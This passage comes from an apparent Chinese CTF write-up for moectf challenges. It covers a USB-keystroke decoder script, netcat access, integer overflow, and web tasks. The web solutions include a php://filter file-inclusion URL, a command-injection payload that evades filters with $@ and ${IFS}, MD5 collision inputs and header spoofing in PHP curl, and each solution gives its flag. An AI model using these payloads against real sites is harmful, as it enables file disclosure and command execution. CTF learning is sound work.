punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 即第三个字节</span>        <span class="token keyword">if</span> code <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token comment"># newline or down arrow - move down</span>        <span class="token keyword">if</span> code <span class="token operator">==</span> <span class="token number">0x51</span> <span class="token keyword">or</span> code <span class="token operator">==</span> <span class="token number">0x28</span><span class="token punctuation">:</span>            pos <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">continue</span>        <span class="token comment"># up arrow - move up</span>        <span class="token keyword">if</span> code <span class="token operator">==</span> <span class="token number">0x52</span><span class="token punctuation">:</span>            pos <span class="token operator">-=</span> <span class="token number">1</span>            <span class="token keyword">continue</span>        <span class="token comment"># select the character based on the Shift key</span>        <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lines<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> pos<span class="token punctuation">:</span>            lines<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> code <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> code <span class="token keyword">in</span> usb_codes<span class="token punctuation">:</span>                    lines<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">+=</span> usb_codes<span class="token punctuation">[</span>code<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    lines<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token string">"&lt;un>"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> code <span class="token keyword">in</span> usb_codes<span class="token punctuation">:</span>                    lines<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">+=</span> usb_codes<span class="token punctuation">[</span>code<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    lines<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token string">"&lt;un>"</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        result <span class="token operator">+=</span> x        <span class="token comment"># print(x)</span>    fout <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\(后面路径省略)'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    fout<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    code2chr<span class="token punctuation">(</span><span class="token string">'C:\\Users\\(后面路径省略)'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>得到flag</p><details><summary>Flag</summary><p><b>moectf{D@m3daNe_D4me_yoooooo}</b></p></details><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="02-test-your-nc"><a href="#02-test-your-nc" class="headerlink" title="02 test_your_nc"></a>02 test_your_nc</h3><p>如题</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> pwn.blackbird.wang <span class="token number">9500</span><span class="token function">ls</span><span class="token function">cat</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>得到flag</p><details><summary>Flag</summary><p><b>moectf{enjoy_the_netcat_and_the_shell}</b></p></details><h3 id="03-Int-overflow"><a href="#03-Int-overflow" class="headerlink" title="03 Int_overflow"></a>03 Int_overflow</h3><p>试着试着给了个 <code>-1</code> ，得到flag</p><details><summary>Flag</summary><p><b>moectf{y0ul0v3m3m3l0v3y0u_1nt0v3rfl0w}</b></p></details><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p><del>PHP真实绝绝子</del></p><h3 id="02-Web安全入门指北—GET"><a href="#02-Web安全入门指北—GET" class="headerlink" title="02 Web安全入门指北—GET"></a>02 Web安全入门指北—GET</h3><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://47.93.215.154:10000/?moe<span class="token operator">=</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><details><summary>Flag</summary><p><b>moectf{We1c0me_t0_CTF_Web!}</b></p></details><h3 id="03-Web安全入门指北—POST"><a href="#03-Web安全入门指北—POST" class="headerlink" title="03 Web安全入门指北—POST"></a>03 Web安全入门指北—POST</h3><p>随便找个在线工具发POST就行</p><details><summary>Flag</summary><p><b>moectf{POST_1s_an_1mp0rtant_m3th0d!}</b></p></details><h3 id="04-Web安全入门指北—小饼干"><a href="#04-Web安全入门指北—小饼干" class="headerlink" title="04 Web安全入门指北—小饼干"></a>04 Web安全入门指北—小饼干</h3><p>浏览器F12 把cookies里值改成1，刷新</p><details><summary>Flag</summary><p><b>moectf{C00kie_1s_sw33t!}</b></p></details><h3 id="05-2048"><a href="#05-2048" class="headerlink" title="05 2048"></a>05 2048</h3><p>审查元素大法好，找到代码</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">getFlag</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">;</span>        req<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"flag.php?score="</span><span class="token operator">+</span>obj<span class="token punctuation">.</span>score<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        req<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        req<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>打开发现申必数字<code>50000</code></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://47.93.215.154:5001/flag.php?score<span class="token operator">=</span><span class="token number">50000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>获得flag</p><details><summary>Flag</summary><p><b>moectf{2048_1s_intere5t1ng!}</b></p></details><p>参考博客</p><blockquote><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">(6条消息) 总结ctf中 MD5 绕过的一些思路_y0un9er-CSDN博客_ctf md5绕过</a></p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">a</span><span class="token operator">=</span>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<span class="token assign-left variable">b</span><span class="token operator">=</span>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><details><summary>Flag</summary><p><b>moectf{xdsec3gf9dfg62fh342}</b></p></details><h3 id="06-ezinclude"><a href="#06-ezinclude" class="headerlink" title="06 ezinclude"></a>06 ezinclude</h3><p>参考博客</p><blockquote><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/99728785">https://blog.csdn.net/vhkjhwbs/article/details/99728785</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/87090539">https://blog.csdn.net/qq_42181428/article/details/87090539</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/10683379.html">https://www.cnblogs.com/ichunqiu/p/10683379.html</a></p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://47.98.215.112:5000/?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>得到base64字符串，解码</p><details><summary>Flag</summary><p><b>moectf{xdsec6asdgas7ahfsfaxczc}</b></p></details><h3 id="07-babeRCE"><a href="#07-babeRCE" class="headerlink" title="07 babeRCE"></a>07 babeRCE</h3><p>参考博客</p><blockquote><p><a href="https://blog.csdn.net/qq_44657899/article/details/107676580">https://blog.csdn.net/qq_44657899/article/details/107676580</a></p></blockquote><p>挺有意思，试了里面好多法子，最后试出来了然后还得每个字符之间都加</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://47.93.215.154:5000/?rce<span class="token operator">=</span>t<span class="token variable">$@</span>a<span class="token variable">$@</span>c<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>f<span class="token variable">$@</span>l<span class="token variable">$@</span>a<span class="token variable">$@</span>g<span class="token variable">$@</span><span class="token builtin class-name">.</span><span class="token variable">$@</span>p<span class="token variable">$@</span>h<span class="token variable">$@</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><details><summary>Flag</summary><p><b>oectf{Do_y0u_l1k3_Rcccccccccccccce?}</b></p></details>### 08 Do you know HTTP?<p>php真是绝绝子</p><p>用php+curl，查阅了文档，然后一步一步按题给的要求加东西</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token string single-quoted-string">'http://47.93.215.154:5002'</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$header</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>    <span class="token string double-quoted-string">"Referer: www.ltyyds.com"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"X-Forwarded-For: 127.0.0.1"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"User-Agent: LT"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"Date: Dec, 26 Dec 2015 17:30:00 GMT"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_CUSTOMREQUEST</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'HS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_TIMEOUT</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#curl_setopt($ch,CURLOPT_HTTPHEADER,array("X-Forwarded-For: 127.0.0.1"));</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HTTPHEADER</span><span class="token punctuation">,</span><span class="token variable">$header</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>得到flag</p><details><summary>Flag</summary><p><b>moectf{HTTPHeaders_1s_s0_ea5y!}</b></p></details>